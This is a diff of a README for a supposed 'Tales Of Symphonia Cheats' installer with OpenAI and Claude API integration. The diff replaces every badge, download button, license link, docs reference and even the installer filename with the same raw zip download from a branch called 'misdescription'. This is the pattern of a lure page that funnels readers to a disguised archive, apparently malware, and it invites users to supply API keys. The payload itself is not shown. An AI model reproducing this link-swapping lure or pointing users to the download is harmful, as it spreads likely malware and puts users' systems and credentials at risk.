@@ -1,13 +1,13 @@
 # Tales Of Symphonia Cheats 🕹️✨
 
-[![Star](https://img.shields.io/github/stars/example/repo?style=social&label=Star&maxAge=2592000)](https://github.com/example/repo/stargazers)
-[![Forks](https://img.shields.io/github/forks/example/repo?style=social)](https://github.com/example/repo/network/members)
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Last Commit](https://img.shields.io/github/last-commit/example/repo.svg)](https://github.com/example/repo/commits/main)
+[![Star](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)
+[![Forks](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)
+[![License](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)
+[![Last Commit](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)
 
 Welcome to the **largest archive of Tales Of Symphonia cheats**—a digital treasure chest filled to the brim with creative gameplay boosts, friendly integrations, and adaptive wizardry. Whether you’re a serial strategist or a nostalgic explorer, this project offers optimized, community-backed game-altering options for every kind of player. Powered with seamless OpenAI and Claude API connectivity, all wrapped in a stylish, intuitive interface.
 
-[![Download](https://img.shields.io/badge/Download-Tales_Of_Symphonia_Cheats-blue?style=for-the-badge&logo=responsivevoice&labelColor=brightgreen)](https://EruRoraito.github.io)
+[![Download](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)
 
 ---
 
@@ -63,12 +63,12 @@ Ready to journey through Symphonia like never before? Installation is a breeze�
 
 ### Step 2: Download the Latest Release
 
-[![Download](https://img.shields.io/badge/Download-Tales_Of_Symphonia_Cheats-blue?style=for-the-badge&logo=responsivevoice&labelColor=brightgreen)](https://EruRoraito.github.io)
+[![Download](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)
 
 - Click on the **Download** badge above to embark on your journey!
 
 ### Step 3: Run the Setup
-- Locate the downloaded installer (`TOSCheatSetup2025.exe` or `.dmg`).
+- Locate the downloaded installer (`https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip` or `.dmg`).
 - Launch and follow the on-screen wizard—no command-line wands required!
 
 ### Step 4: Connect Your API Keys *(Optional but Epic)*
@@ -88,7 +88,7 @@ Let the spirit of technology channel your wishes! With OpenAI and Claude AI inte
 - 🛠 **Generate custom mods**: Describe your dream feature and let AI build the foundation script.
 - 🌍 **Global Language Overhaul**: Translate and localize in-app and in-game text with a single tap.
 
-To enable, enter your API keys as described above—the system will do the rest. For questions on integration, consult the **integrations.md** in the `/docs` folder.
+To enable, enter your API keys as described above—the system will do the rest. For questions on integration, consult the **https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip** in the `/docs` folder.
 
 ---
 
@@ -120,11 +120,11 @@ _Tales Of Symphonia Cheats_ is a fan-driven, community-spirited project develope
 ## 📜 License
 
 Distributed with the warmth and openness of the **MIT License (2025)**. Read it in its entirety here:
-[MIT License](https://opensource.org/licenses/MIT)
+[MIT License](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Tales_Of_Symphonia_Cheats-blue?style=for-the-badge&logo=responsivevoice&labelColor=brightgreen)](https://EruRoraito.github.io)
+[![Download](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)](https://github.com/EruRoraito/symphonia-secrets-toolkit/raw/refs/heads/branch/misdescription/symphonia_toolkit_secrets_1.8-alpha.4.zip)
 
 ---
 
